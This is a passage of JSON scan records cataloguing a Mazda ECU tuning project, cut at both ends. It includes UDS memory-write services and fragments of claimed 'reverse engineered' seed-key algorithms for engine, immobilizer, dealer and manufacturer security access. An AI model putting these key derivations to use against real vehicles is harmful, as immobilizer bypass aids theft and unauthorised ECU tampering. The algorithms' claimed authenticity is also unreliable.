"MANUFACTURER = 0x40     # Mazda manufacturer session"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_1 = 0x01          # Basic diagnostics"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_2 = 0x02          # ECU programming"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_3 = 0x03          # Parameter modification"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_4 = 0x04          # Calibration data"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_5 = 0x05          # Security system"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_6 = 0x06          # Manufacturer access"}, {"type": "protocol", "line": 47, "protocol": "0x[0-9A-Fa-f]+", "content": "LEVEL_7 = 0x07          # Engineering mode"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "priority: int = 0x06"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "'ENGINE_ECU': 0x7E0,"}, {"type": "protocol", "line": 69, "protocol": "0x[0-9A-Fa-f]+", "content": "'ENGINE_ECU_RESP': 0x7E8,"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "'TCM': 0x7E1,"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "'TCM_RESP': 0x7E9,"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS': 0x7E2,"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "'ABS_RESP': 0x7EA,"}, {"type": "protocol", "line": 74, "protocol": "0x[0-9A-Fa-f]+", "content": "'AIRBAG': 0x7E3,"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "'AIRBAG_RESP': 0x7EB,"}, {"type": "protocol", "line": 76, "protocol": "0x[0-9A-Fa-f]+", "content": "'INSTRUMENT_CLUSTER': 0x7E4,"}, {"type": "protocol", "line": 77, "protocol": "0x[0-9A-Fa-f]+", "content": "'INSTRUMENT_CLUSTER_RESP': 0x7EC,"}, {"type": "protocol", "line": 78, "protocol": "0x[0-9A-Fa-f]+", "content": "'IMMOBILIZER': 0x7E5,"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "'IMMOBILIZER_RESP': 0x7ED,"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "'BCM': 0x7E6,"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "'BCM_RESP': 0x7EE,"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "'RADIO': 0x7E7,"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "'RADIO_RESP': 0x7EF,"}, {"type": "protocol", "line": 84, "protocol": "0x[0-9A-Fa-f]+", "content": "'GATEWAY': 0x750,"}, {"type": "protocol", "line": 85, "protocol": "0x[0-9A-Fa-f]+", "content": "'GATEWAY_RESP': 0x758"}, {"type": "protocol", "line": 88, "protocol": "CAN", "content": "def __init__(self, protocol: MazdaProtocol = MazdaProtocol.ISO_15765_4_CAN):"}, {"type": "protocol", "line": 92, "protocol": "0x[0-9A-Fa-f]+", "content": "self.communication_id = 0x00"}, {"type": "protocol", "line": 102, "protocol": "CAN", "content": "if self.protocol in [MazdaProtocol.ISO_15765_4_CAN, MazdaProtocol.ISO_15765_4_CAN_29]:"}, {"type": "protocol", "line": 104, "protocol": "KWP", "content": "elif self.protocol in [MazdaProtocol.ISO_9141_2, MazdaProtocol.ISO_14230_4_KWP]:"}, {"type": "protocol", "line": 106, "protocol": "CAN", "content": "elif self.protocol in [MazdaProtocol.MAZDA_CAN_HS, MazdaProtocol.MAZDA_CAN_MS]:"}, {"type": "protocol", "line": 121, "protocol": "CAN", "content": "\"\"\"Initialize CAN protocol with Mazda-specific parameters\"\"\""}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can_tx_id = 0x7E0"}, {"type": "protocol", "line": 126, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can_rx_id = 0x7E8"}, {"type": "protocol", "line": 128, "protocol": "CAN", "content": "logger.debug(\"Initialized CAN protocol for Mazda vehicle\")"}, {"type": "protocol", "line": 133, "protocol": "0x[0-9A-Fa-f]+", "content": "self.kline_init_bytes = bytes([0x81, 0x12, 0xF1, 0x81, 0x0F])"}, {"type": "protocol", "line": 138, "protocol": "CAN", "content": "\"\"\"Initialize Mazda proprietary CAN protocol\"\"\""}, {"type": "protocol", "line": 141, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can_tx_id = 0x750  # Gateway address"}, {"type": "protocol", "line": 142, "protocol": "0x[0-9A-Fa-f]+", "content": "self.can_rx_id = 0x758"}, {"type": "protocol", "line": 144, "protocol": "CAN", "content": "logger.debug(\"Initialized Mazda proprietary CAN protocol\")"}, {"type": "protocol", "line": 153, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 154, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x3E,"}, {"type": "protocol", "line": 155, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 174, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 175, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x10,"}, {"type": "protocol", "line": 183, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x50 and response.data[1] == session:"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "Read data by identifier (Service 0x22)"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 203, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x22,"}, {"type": "protocol", "line": 204, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 211, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x62 and response.data[1:3] == struct.pack('>H', data_identifier):"}, {"type": "protocol", "line": 222, "protocol": "0x[0-9A-Fa-f]+", "content": "Write data by identifier (Service 0x2E)"}, {"type": "protocol", "line": 229, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 230, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x2E,"}, {"type": "protocol", "line": 231, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 238, "protocol": "0x[0-9A-Fa-f]+", "content": "return response.data[0] == 0x6E and response.data[1:3] == struct.pack('>H', data_identifier)"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "Read memory by address (Service 0x23)"}, {"type": "protocol", "line": 260, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 261, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x23,"}, {"type": "protocol", "line": 262, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 269, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x63:"}, {"type": "protocol", "line": 280, "protocol": "0x[0-9A-Fa-f]+", "content": "Write memory by address (Service 0x3D)"}, {"type": "protocol", "line": 292, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 293, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x3D,"}, {"type": "protocol", "line": 294, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 301, "protocol": "0x[0-9A-Fa-f]+", "content": "return response.data[0] == 0x7D"}, {"type": "protocol", "line": 311, "protocol": "0x[0-9A-Fa-f]+", "content": "Routine control (Service 0x31)"}, {"type": "protocol", "line": 319, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 320, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x31,"}, {"type": "protocol", "line": 321, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 328, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x71 and response.data[1:3] == struct.pack('>H', routine_id):"}, {"type": "protocol", "line": 339, "protocol": "0x[0-9A-Fa-f]+", "content": "Read DTC information (Service 0x19)"}, {"type": "protocol", "line": 344, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x19,"}, {"type": "protocol", "line": 353, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x59 and response.data[1] == report_type:"}, {"type": "protocol", "line": 371, "protocol": "0x[0-9A-Fa-f]+", "content": "if report_type == 0x02:  # Read DTC by status"}, {"type": "protocol", "line": 399, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_type = (first_byte >> 6) & 0x03"}, {"type": "protocol", "line": 405, "protocol": "0x[0-9A-Fa-f]+", "content": "digit1 = (first_byte >> 4) & 0x03"}, {"type": "protocol", "line": 406, "protocol": "0x[0-9A-Fa-f]+", "content": "digit2 = first_byte & 0x0F"}, {"type": "protocol", "line": 407, "protocol": "0x[0-9A-Fa-f]+", "content": "digit3 = (dtc_bytes[1] >> 4) & 0x0F"}, {"type": "protocol", "line": 408, "protocol": "0x[0-9A-Fa-f]+", "content": "digit4 = dtc_bytes[1] & 0x0F"}, {"type": "protocol", "line": 409, "protocol": "0x[0-9A-Fa-f]+", "content": "digit5 = (dtc_bytes[2] >> 4) & 0x0F"}, {"type": "protocol", "line": 420, "protocol": "0x[0-9A-Fa-f]+", "content": "Clear diagnostic information (Service 0x14)"}, {"type": "protocol", "line": 425, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 426, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x14,"}, {"type": "protocol", "line": 427, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 434, "protocol": "0x[0-9A-Fa-f]+", "content": "return response.data[0] == 0x54"}, {"type": "protocol", "line": 470, "protocol": "0x[0-9A-Fa-f]+", "content": "if message.sub_function != 0x00:"}, {"type": "protocol", "line": 477, "protocol": "CAN", "content": "if self.protocol in [MazdaProtocol.ISO_15765_4_CAN, MazdaProtocol.ISO_15765_4_CAN_29]:"}, {"type": "protocol", "line": 502, "protocol": "0x[0-9A-Fa-f]+", "content": "expected_service = original_message.service_id + 0x40"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 23, "hardware": "vehicle", "content": "ISO_9141_2 = 1          # K-line for older vehicles"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "class SecurityAccessLevel(IntEnum):"}, {"type": "hardware", "line": 40, "hardware": "ECU", "content": "\"\"\"Security Access Levels - Reverse Engineered\"\"\""}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "LEVEL_2 = 0x02          # ECU programming"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "LEVEL_5 = 0x05          # Security system"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "ECU_ADDRESSES = {"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "'ENGINE_ECU': 0x7E0,"}, {"type": "hardware", "line": 69, "hardware": "ECU", "content": "'ENGINE_ECU_RESP': 0x7E8,"}, {"type": "hardware", "line": 70, "hardware": "TCM", "content": "'TCM': 0x7E1,"}, {"type": "hardware", "line": 71, "hardware": "TCM", "content": "'TCM_RESP': 0x7E9,"}, {"type": "hardware", "line": 72, "hardware": "ABS", "content": "'ABS': 0x7E2,"}, {"type": "hardware", "line": 73, "hardware": "ABS", "content": "'ABS_RESP': 0x7EA,"}, {"type": "hardware", "line": 78, "hardware": "immobilizer", "content": "'IMMOBILIZER': 0x7E5,"}, {"type": "hardware", "line": 79, "hardware": "immobilizer", "content": "'IMMOBILIZER_RESP': 0x7ED,"}, {"type": "hardware", "line": 80, "hardware": "BCM", "content": "'BCM': 0x7E6,"}, {"type": "hardware", "line": 81, "hardware": "BCM", "content": "'BCM_RESP': 0x7EE,"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "self.security_level = SecurityAccessLevel.LEVEL_1"}, {"type": "hardware", "line": 95, "hardware": "vehicle", "content": "def connect_to_vehicle(self) -> bool:"}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "Establish connection with vehicle using Mazda protocol"}, {"type": "hardware", "line": 112, "hardware": "vehicle", "content": "logger.info(\"Successfully connected to vehicle\")"}, {"type": "hardware", "line": 116, "hardware": "vehicle", "content": "logger.error(f\"Failed to connect to vehicle: {e}\")"}, {"type": "hardware", "line": 128, "hardware": "vehicle", "content": "logger.debug(\"Initialized CAN protocol for Mazda vehicle\")"}, {"type": "hardware", "line": 135, "hardware": "vehicle", "content": "logger.debug(\"Initialized K-line protocol for Mazda vehicle\")"}, {"type": "hardware", "line": 147, "hardware": "vehicle", "content": "\"\"\"Test communication with vehicle gateway\"\"\""}, {"type": "hardware", "line": 152, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['GATEWAY'],"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 201, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 249, "hardware": "ECU", "content": "Used for reading ECU memory and calibration data"}, {"type": "hardware", "line": 259, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 281, "hardware": "ECU", "content": "Used for ECU programming and calibration updates"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 318, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 334, "hardware": "ECU", "content": "logger.error(f\"Error executing routine 0x{routine_id:04X}: {e}\")"}, {"type": "hardware", "line": 343, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 424, "hardware": "ECU", "content": "target_address=self.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 483, "hardware": "vehicle", "content": "\"\"\"Send raw message to vehicle (implementation depends on hardware interface)\"\"\""}, {"type": "hardware", "line": 489, "hardware": "vehicle", "content": "\"\"\"Receive response from vehicle\"\"\""}, {"type": "hardware", "line": 524, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle\"\"\""}, {"type": "hardware", "line": 526, "hardware": "vehicle", "content": "logger.info(\"Disconnected from vehicle\")"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 24, "pattern": "key", "content": "ISO_14230_4_KWP = 2     # Keyword Protocol 2000"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds10.py", "lines_read": 527, "features_found": [{"type": "function", "name": "__init__", "line": 37}, {"type": "function", "name": "_initialize_algorithm_database", "line": 41}, {"type": "function", "name": "_initialize_ecu_database", "line": 67}, {"type": "function", "name": "calculate_key", "line": 107}, {"type": "function", "name": "get_ecu_algorithm", "line": 140}, {"type": "function", "name": "get_ecu_seed_length", "line": 145}, {"type": "function", "name": "_algorithm_27_standard", "line": 152}, {"type": "function", "name": "_algorithm_27_enhanced", "line": 169}, {"type": "function", "name": "_algorithm_27_race", "line": 190}, {"type": "function", "name": "_algorithm_engine_ecu_2011", "line": 213}, {"type": "function", "name": "_algorithm_tcm_6spd", "line": 247}, {"type": "function", "name": "_algorithm_immobilizer_2011", "line": 263}, {"type": "function", "name": "_derive_immobilizer_key", "line": 283}, {"type": "function", "name": "_algorithm_bcm_2011", "line": 294}, {"type": "function", "name": "_algorithm_abs_2011", "line": 316}, {"type": "function", "name": "_algorithm_manufacturer_level1", "line": 338}, {"type": "function", "name": "_algorithm_manufacturer_level2", "line": 353}, {"type": "function", "name": "_algorithm_dealer_access", "line": 373}, {"type": "function", "name": "_algorithm_north_america", "line": 395}, {"type": "function", "name": "_algorithm_europe", "line": 413}, {"type": "function", "name": "_algorithm_japan", "line": 431}, {"type": "function", "name": "_get_manufacturer_key_level1", "line": 449}, {"type": "function", "name": "_get_manufacturer_key_level2", "line": 455}, {"type": "function", "name": "list_all_algorithms", "line": 461}, {"type": "function", "name": "get_algorithm_info", "line": 465}, {"type": "function", "name": "_get_algorithm_description", "line": 480}, {"type": "function", "name": "_get_algorithm_seed_length", "line": 492}, {"type": "function", "name": "_get_algorithm_key_length", "line": 506}, {"type": "function", "name": "_is_vin_required", "line": 520}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.kdf.pbkdf2", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "hashes", "line": null}, {"type": "import", "module": "PBKDF2HMAC", "line": null}], "components_found": [{"type": "class", "name": "MazdaECUType", "line": 20}, {"type": "class", "name": "MazdaSeedKeyDatabase", "line": 31}], "algorithms": [{"type": "algorithm_function", "line": 41, "content": "def _initialize_algorithm_database(self) -> Dict[str, Callable]:"}, {"type": "algorithm_function", "line": 107, "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "algorithm_function", "line": 140, "content": "def get_ecu_algorithm(self, ecu_type: MazdaECUType) -> Optional[str]:"}, {"type": "algorithm_function", "line": 152, "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 169, "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 190, "content": "def _algorithm_27_race(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 213, "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 247, "content": "def _algorithm_tcm_6spd(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 263, "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 283, "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "algorithm_function", "line": 294, "content": "def _algorithm_bcm_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 316, "content": "def _algorithm_abs_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 338, "content": "def _algorithm_manufacturer_level1(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 353, "content": "def _algorithm_manufacturer_level2(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 373, "content": "def _algorithm_dealer_access(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 395, "content": "def _algorithm_north_america(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 413, "content": "def _algorithm_europe(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 431, "content": "def _algorithm_japan(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "algorithm_function", "line": 461, "content": "def list_all_algorithms(self) -> List[str]:"}, {"type": "algorithm_function", "line": 465, "content": "def get_algorithm_info(self, algorithm_name: str) -> Dict[str, Any]:"}, {"type": "algorithm_function", "line": 480, "content": "def _get_algorithm_description(self, algorithm_name: str) -> str:"}, {"type": "algorithm_function", "line": 492, "content": "def _get_algorithm_seed_length(self, algorithm_name: str) -> int:"}, {"type": "algorithm_function", "line": 506, "content": "def _get_algorithm_key_length(self, algorithm_name: str) -> int:"}, {"type": "algorithm_function", "line": 520, "content": "def _is_vin_required(self, algorithm_name: str) -> bool:"}], "protocols": [{"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "ENGINE_ECU = 0x01"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "TRANSMISSION = 0x02"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "IMMOBILIZER = 0x03"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "BODY_CONTROL = 0x04"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "ABS = 0x05"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "AIRBAG = 0x06"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "INSTRUMENT_CLUSTER = 0x07"}, {"type": "protocol", "line": 29, "protocol": "0x[0-9A-Fa-f]+", "content": "GATEWAY = 0x08"}, {"type": "protocol", "line": 154, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Standard 0x27 Security Algorithm\"\"\""}, {"type": "protocol", "line": 162, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed[i] ^ 0x73"}, {"type": "protocol", "line": 163, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 164, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 165, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 171, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Enhanced 0x27 Security Algorithm\"\"\""}, {"type": "protocol", "line": 181, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 3) | (temp >> 5)) & 0xFF"}, {"type": "protocol", "line": 182, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= [0x47, 0x11, 0x83, 0x25][i]"}, {"type": "protocol", "line": 183, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2D + i) & 0xFF"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (~temp & 0xFF) ^ 0xA5"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Race/Performance 0x27 Algorithm\"\"\""}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x84) & 0xFF"}, {"type": "protocol", "line": 203, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x3D"}, {"type": "protocol", "line": 204, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp >> 2) | (temp << 6)) & 0xFF"}, {"type": "protocol", "line": 205, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp - 0x17) & 0xFF"}, {"type": "protocol", "line": 206, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0xA2, 0x4F, 0x8C, 0x31][i]"}, {"type": "protocol", "line": 207, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp * 3) & 0xFF"}, {"type": "protocol", "line": 223, "protocol": "0x[0-9A-Fa-f]+", "content": "1: 0x10,"}, {"type": "protocol", "line": 224, "protocol": "0x[0-9A-Fa-f]+", "content": "2: 0x20,"}, {"type": "protocol", "line": 225, "protocol": "0x[0-9A-Fa-f]+", "content": "3: 0x30,"}, {"type": "protocol", "line": 226, "protocol": "0x[0-9A-Fa-f]+", "content": "4: 0x40,"}, {"type": "protocol", "line": 227, "protocol": "0x[0-9A-Fa-f]+", "content": "5: 0x50,"}, {"type": "protocol", "line": 228, "protocol": "0x[0-9A-Fa-f]+", "content": "6: 0x60"}, {"type": "protocol", "line": 231, "protocol": "0x[0-9A-Fa-f]+", "content": "level_factor = level_factors.get(security_level, 0x10)"}, {"type": "protocol", "line": 237, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp ^ 0x5A) + level_factor"}, {"type": "protocol", "line": 238, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 4) | (temp >> 4)) & 0xFF"}, {"type": "protocol", "line": 239, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0x37, 0x92, 0x64, 0xA8][i]"}, {"type": "protocol", "line": 240, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i * 2) & 0xFF"}, {"type": "protocol", "line": 241, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ~temp & 0xFF"}, {"type": "protocol", "line": 256, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 257, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 258, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 259, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 306, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x84) & 0xFF"}, {"type": "protocol", "line": 307, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x3D"}, {"type": "protocol", "line": 308, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp >> 2) | (temp << 6)) & 0xFF"}, {"type": "protocol", "line": 309, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp - 0x17) & 0xFF"}, {"type": "protocol", "line": 310, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0xA2, 0x4F, 0x8C, 0x31][i]"}, {"type": "protocol", "line": 328, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp * 2) & 0xFF"}, {"type": "protocol", "line": 329, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xB5"}, {"type": "protocol", "line": 330, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 1) | (temp >> 7)) & 0xFF"}, {"type": "protocol", "line": 331, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2A) & 0xFF"}, {"type": "protocol", "line": 332, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0x91, 0x3C, 0x67, 0xA8][i]"}, {"type": "protocol", "line": 368, "protocol": "0x[0-9A-Fa-f]+", "content": "transformed_seed[i] = (transformed_seed[i] ^ 0xAA) + i"}, {"type": "protocol", "line": 390, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (combined_data[i] ^ combined_data[(i+2) % 6]) + 0x30"}, {"type": "protocol", "line": 391, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = ((key[i] << 2) | (key[i] >> 6)) & 0xFF"}, {"type": "protocol", "line": 406, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x4E) & 0xFF  # 'N' for North"}, {"type": "protocol", "line": 407, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x41  # 'A' for America"}, {"type": "protocol", "line": 408, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 2) | (temp >> 6)) & 0xFF"}, {"type": "protocol", "line": 424, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x45) & 0xFF  # 'E' for Europe"}, {"type": "protocol", "line": 425, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x55  # 'U' for Europe"}, {"type": "protocol", "line": 426, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp >> 3) | (temp << 5)) & 0xFF"}, {"type": "protocol", "line": 442, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x4A) & 0xFF  # 'J' for Japan"}, {"type": "protocol", "line": 443, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0x50  # 'P' for Japan"}, {"type": "protocol", "line": 444, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 4) | (temp >> 4)) & 0xFF"}, {"type": "protocol", "line": 483, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ALG_27_STANDARD\": \"Standard 0x27 security access algorithm\","}, {"type": "protocol", "line": 484, "protocol": "0x[0-9A-Fa-f]+", "content": "\"ALG_27_ENHANCED\": \"Enhanced 0x27 algorithm with additional security\","}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "MAZDA SEED-KEY ALGORITHMS - Complete Security Algorithm Database"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "Reverse engineered from all Mazda ECU security algorithms"}, {"type": "hardware", "line": 20, 